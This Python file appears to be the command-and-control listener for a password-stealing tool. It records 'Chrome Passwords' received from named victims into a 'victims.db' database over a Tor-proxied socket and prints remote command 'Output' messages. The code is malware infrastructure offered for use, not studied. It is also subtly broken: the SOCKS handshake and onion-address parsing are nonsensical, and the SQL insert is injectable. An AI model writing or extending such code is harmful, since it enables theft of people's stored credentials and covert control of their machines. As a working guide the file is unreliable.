import socket, sqlite3,time

dbConnection = sqlite3.connect("victims.db")
dbCursor = dbConnection.cursor()

# Set up a socket to connect to the Tor SOCKS proxy
socks_proxy = ('127.0.0.1', 9050)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect(socks_proxy)

# Send a command to the SOCKS proxsy to create a new circuit
sock.send(b'\x05\x01\x00')
response = sock.recv(1024)

# Define the listening port for the peer
listen_port = 1234

# Create a socket to listen for incoming connections
listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listen_sock.bind(('0.0.0.0', listen_port))
listen_sock.listen(1)

# Print the peer's onion address
print('Your onion address: %s.onion:%d' % (response[5:].decode('ascii'), listen_port))

# Connect to the other peer through the SOCKS proxy
dest_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
dest_sock.settimeout(10)
dest_sock.listen(10)

def hearingLoop():
    # Start the chat loop
    while True:
        # Wait for incoming messages
        try:
            client_sock, client_addr = listen_sock.accept()
            message = client_sock.recv(1024).decode('ascii')
            #send all chrome passwords if didnt already
            if(message.startswith("Chrome Passwords: ")):
                passwords = message[len("Chrome Passwords: "):message.find("Name:")]
                name = message[(len("Chrome Passwords: ")+len(passwords)+len("Name: ")):]
                #add the passwords to the DB
                dbCursor.execute(f"INSERT INTO victims VALUES ('{name}','{time.time()}','{passwords}')")
                pass
            if(message.startswith("Output: ")):
                output = message[len("Output"):]
                print(output)
            client_sock.close()
        except socket.timeout:
            pass

def sendMessage(message):
    dest_sock.send(message.encode('ascii'))